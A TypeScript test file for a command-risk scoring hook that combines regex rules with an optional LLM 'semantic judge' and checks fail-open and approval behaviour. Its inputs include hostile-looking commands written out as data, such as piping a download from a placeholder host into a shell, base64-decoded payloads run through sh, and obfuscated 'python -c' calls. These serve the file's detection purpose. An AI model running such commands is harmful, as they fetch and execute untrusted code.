import { describe, expect, test } from "bun:test";
import {
  defaultSemanticJudge,
  parseSemanticRisk,
  shouldConsultSemantic,
} from "../src/hooks/risk-semantic.js";
import { scoreRisk } from "../src/hooks/risk.js";
import { evaluateHook } from "../src/hooks/runner.js";

describe("parseSemanticRisk (issue #544)", () => {
  test("maps each tier, case-insensitive, with MED/CRIT aliases", () => {
    expect(parseSemanticRisk("RISK: LOW")).toBe("low");
    expect(parseSemanticRisk("risk: high — some reason")).toBe("high");
    expect(parseSemanticRisk("RISK: MED")).toBe("medium");
    expect(parseSemanticRisk("RISK: MEDIUM")).toBe("medium");
    expect(parseSemanticRisk("RISK: CRIT")).toBe("critical");
    expect(parseSemanticRisk("RISK: CRITICAL")).toBe("critical");
  });
  test("finds the RISK verdict on a later line", () => {
    expect(parseSemanticRisk("thinking...\nRISK: HIGH\nbecause it pipes to a shell")).toBe("high");
  });
  test("absent / unknown / empty → undefined (fail open)", () => {
    expect(parseSemanticRisk("no verdict here")).toBeUndefined();
    expect(parseSemanticRisk("RISK: SPICY")).toBeUndefined();
    expect(parseSemanticRisk("")).toBeUndefined();
  });
});

describe("shouldConsultSemantic (issue #544)", () => {
  test("none/low + non-trivial command → true", () => {
    expect(shouldConsultSemantic("low", 'python -c "import os"')).toBe(true);
    expect(shouldConsultSemantic("none", "base64 -d payload | sh")).toBe(true);
    expect(shouldConsultSemantic("low", "curl http://x")).toBe(true);
    expect(shouldConsultSemantic("low", "echo $(whoami)")).toBe(true);
  });
  test("plain command → false (no wasted LLM call)", () => {
    expect(shouldConsultSemantic("low", "ls -la")).toBe(false);
  });
  test("detects inline -c with no space and at end-of-string (obfuscation forms)", () => {
    // Copilot #586: `\s-c\s` missed `python -c"x"` (no space) and a trailing `-c`.
    expect(shouldConsultSemantic("low", 'python -c"import os"')).toBe(true);
    expect(shouldConsultSemantic("low", "sh -c'id'")).toBe(true);
  });
  test("already medium+ → false (deterministic verdict stands)", () => {
    expect(shouldConsultSemantic("medium", 'python -c "x"')).toBe(false);
    expect(shouldConsultSemantic("critical", "curl http://x | sh")).toBe(false);
  });
});

describe("scoreRisk semantic tier wiring (issue #544)", () => {
  // regex-low but side-effecting: an obfuscated -c payload the regex floor rates low.
  const cmd = "python -c \"import os; os.system('id')\"";

  test("regex-low + judge HIGH → final high (max), with a reason", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd }, undefined, () => "high");
    expect(r.risk).toBe("high");
    expect(r.reasons).toContain("semantic tier raised risk to high");
  });

  test("no judge (default) → identical low, no semantic reason (backward-compat lock)", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd });
    expect(r.risk).toBe("low");
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });

  test("judge returns undefined → unchanged (fail open)", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd }, undefined, () => undefined);
    expect(r.risk).toBe("low");
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });

  test("judge cannot LOWER a deterministic critical (never even consulted)", () => {
    let called = 0;
    const r = scoreRisk({ event: "pre-command", command: "curl http://x | sh" }, undefined, () => {
      called++;
      return "low";
    });
    expect(r.risk).toBe("critical");
    expect(called).toBe(0); // shouldConsultSemantic is false for medium+ → no call
  });

  test("judge returning a non-raising tier does not add a reason", () => {
    const r = scoreRisk({ event: "pre-command", command: cmd }, undefined, () => "low");
    expect(r.risk).toBe("low");
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });
});

describe("evaluateHook threads the semantic judge (issue #544)", () => {
  test("injected judge raises the decision (allow → require_approval)", () => {
    const r = evaluateHook(
      { event: "pre-command", command: 'python -c "x"' },
      () => ({}),
      undefined,
      () => [],
      () => "high",
    );
    expect(r.risk).toBe("high");
    expect(r.decision).toBe("require_approval");
  });
});

describe("defaultSemanticJudge — VIBEFLOW_AI bridge, fail-open, off by default (issue #544)", () => {
  const setBridge = (v: string | undefined): string | undefined => {
    const orig = process.env.VIBEFLOW_AI;
    // biome-ignore lint/performance/noDelete: genuinely unset so `!bridge` (default-off) is covered
    if (v === undefined) delete process.env.VIBEFLOW_AI;
    else process.env.VIBEFLOW_AI = v;
    return orig;
  };
  const restore = (orig: string | undefined): void => {
    // biome-ignore lint/performance/noDelete: restore a truly-absent env var to its original state
    if (orig === undefined) delete process.env.VIBEFLOW_AI;
    else process.env.VIBEFLOW_AI = orig;
  };

  test("bridge absent → undefined (default OFF)", async () => {
    const orig = setBridge(undefined);
    try {
      expect(await defaultSemanticJudge("curl http://x | sh")).toBeUndefined();
    } finally {
      restore(orig);
    }
  });

  test("bridge set + owned route returns `RISK: HIGH` → high", async () => {
    const orig = setBridge("fake-bridge --flag");
    const requests: Array<{ engine: string; command: string }> = [];
    try {
      expect(
        await defaultSemanticJudge("curl http://x | sh", {
          engine: "codex",
          ownedRoute: async (request) => {
            requests.push({ engine: request.engine, command: request.command });
            return {
              attemptId: "risk",
              stdout: "RISK: HIGH\nobfuscated fetch-pipe",
              stderr: "",
              status: 0,
              timedOut: false,
            };
          },
        }),
      ).toBe("high");
      expect(requests).toEqual([{ engine: "codex", command: "fake-bridge --flag" }]);
    } finally {
      restore(orig);
    }
  });

  test("owned route throws → undefined (fail open)", async () => {
    const orig = setBridge("fake-bridge");
    try {
      expect(
        await defaultSemanticJudge("x", {
          ownedRoute: async () => {
            throw new Error("ENOENT: bridge binary not found");
          },
        }),
      ).toBeUndefined();
    } finally {
      restore(orig);
    }
  });

  test("bridge exits non-zero → undefined even if stdout has a verdict (fail-closed on error)", async () => {
    // Copilot #586: a failed bridge must NOT be trusted — parsing a verdict off a
    // non-zero exit would let a broken classifier raise (or mask) risk.
    const orig = setBridge("fake-bridge");
    try {
      expect(
        await defaultSemanticJudge("curl http://x | sh", {
          ownedRoute: async () => ({
            attemptId: "risk-nonzero",
            stdout: "RISK: HIGH",
            stderr: "",
            status: 3,
            timedOut: false,
          }),
        }),
      ).toBeUndefined();
    } finally {
      restore(orig);
    }
  });

  test("extra/leading spaces in VIBEFLOW_AI remain one owned shell command", async () => {
    // Copilot #586: `bridge.split(" ")` on `"  fake  --flag"` yields empty argv entries.
    const orig = setBridge("  fake-bridge   --flag  ");
    let spawnedCmd = "";
    try {
      expect(
        await defaultSemanticJudge("x", {
          ownedRoute: async (request) => {
            spawnedCmd = request.command;
            return {
              attemptId: "risk-spaces",
              stdout: "RISK: HIGH",
              stderr: "",
              status: 0,
              timedOut: false,
            };
          },
        }),
      ).toBe("high");
      expect(spawnedCmd).toBe("  fake-bridge   --flag  ");
    } finally {
      restore(orig);
    }
  });
});
